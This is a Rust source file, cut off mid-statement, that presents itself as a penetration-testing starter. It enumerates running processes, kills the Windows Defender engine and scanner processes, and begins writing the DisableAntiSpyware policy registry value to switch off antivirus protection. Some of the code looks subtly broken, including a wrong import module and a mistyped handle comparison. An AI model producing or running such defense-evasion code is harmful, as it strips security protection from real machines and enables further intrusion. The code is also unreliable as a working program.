use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS};
use winapi::um::processthreadsapi::{OpenProcess};
use winapi::um::winbase::CreateToolhelp32Snapshot;
use winapi::um::tlhelp32::{TH32CS_SNAPPROCESS, PROCESSENTRY32};
use winapi::um::handleapi::{CloseHandle};
use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ};
use std::ptr::{null_mut};
use std::ffi::{OsStr, c_void};
use std::os::windows::ffi::OsStrExt;

fn main() {
    // Disable Windows Defender real-time protection
    disable_defender();

    // Your penetration testing code goes here...
}

fn disable_defender() {
    // Kill Windows Defender processes
    let mut entry = PROCESSENTRY32 {
        dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
        cntUsage: 0,
        th32ProcessID: 0,
        th32DefaultHeapID: 0,
        th32ModuleID: 0,
        cntThreads: 0,
        th32ParentProcessID: 0,
        pcPriClassBase: 0,
        dwFlags: 0,
        szExeFile: [0; 260],
    };
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    let mut found = false;
    if snapshot != -1 {
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        if unsafe { winapi::um::tlhelp32::Process32First(snapshot, &mut entry) } != 0 {
            loop {
                let exe_name = OsStr::from_wide(&entry.szExeFile[..]).to_string_lossy();
                if exe_name.contains("MsMpEng.exe") || exe_name.contains("MpCmdRun.exe") {
                    println!("Killing Windows Defender process: {}", exe_name);
                    let handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, entry.th32ProcessID) };
                    if handle != null_mut() {
                        unsafe { winapi::um::processthreadsapi::TerminateProcess(handle, 0) };
                        unsafe { CloseHandle(handle) };
                        found = true;
                    }
                }
                if unsafe { winapi::um::tlhelp32::Process32Next(snapshot, &mut entry) } == 0 {
                    break;
                }
            }
        }
        unsafe { CloseHandle(snapshot) };
    }
    if !found {
        println!("Windows Defender processes not found.");
    }

    // Disable Windows Defender registry keys
    let reg_key_path = "SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    let reg_key_name = "DisableAntiSpyware";
    let data: u32 = 1;
    let wide_key_path: Vec<u16> = OsStr::new(reg_key_path).encode_wide().chain(Some(0).into_iter()).collect();
    let wide_key_name: Vec<u16> = OsStr::new
